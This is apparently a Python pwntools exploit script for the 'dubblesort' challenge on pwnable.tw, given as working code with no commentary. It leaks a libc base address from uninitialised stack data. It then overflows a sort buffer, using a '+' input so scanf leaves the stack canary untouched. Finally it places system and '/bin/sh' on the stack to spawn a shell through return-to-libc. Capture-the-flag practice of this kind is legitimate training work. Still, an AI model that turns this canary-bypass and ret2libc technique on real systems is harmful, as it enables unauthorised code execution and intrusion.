#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import os
import sys

elfPath = "./dubblesort"
libcPath = "./libc_32.so.6"
remoteAddr = "chall.pwnable.tw"
remotePort = 10101

context.binary = elfPath
elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
        context.log_level = "info"
    if libcPath:
        libc = ELF(libcPath)

context.log_level = "debug"
success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG():
    base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
    info("canary -> {:#x}".format(base + 0xAFE))
    info("sort -> {:#x}".format(base + 0xAB3))
    info("printf -> {:#x}".format(base + 0xA32))
    raw_input("DEBUG: ")

if __name__ == "__main__":
    #  DEBUG()
    io.sendafter(" :", "a" * 0x1c)
    io.recvuntil("a" * 0x1c)
    libc.address = u32(io.recvn(4)) - 0x1ae244 
    success("libc", libc.address)

    io.sendlineafter(" :", "{}".format(32 + 3))
    for i in xrange(32):
        if i == 0x18:
            io.sendlineafter(" :", "+")
            continue
        if i >= 0x19:
            io.sendlineafter(" :", str(0xf0000000))
            continue
        io.sendlineafter(" :", str(i))

    io.sendlineafter(" :", str(int(libc.sym['system'])))
    io.sendlineafter(" :", str(int(libc.sym['system'] + 1)))
    io.sendlineafter(" :", str(int(next(libc.search("/bin/sh")))))
    
    io.interactive()


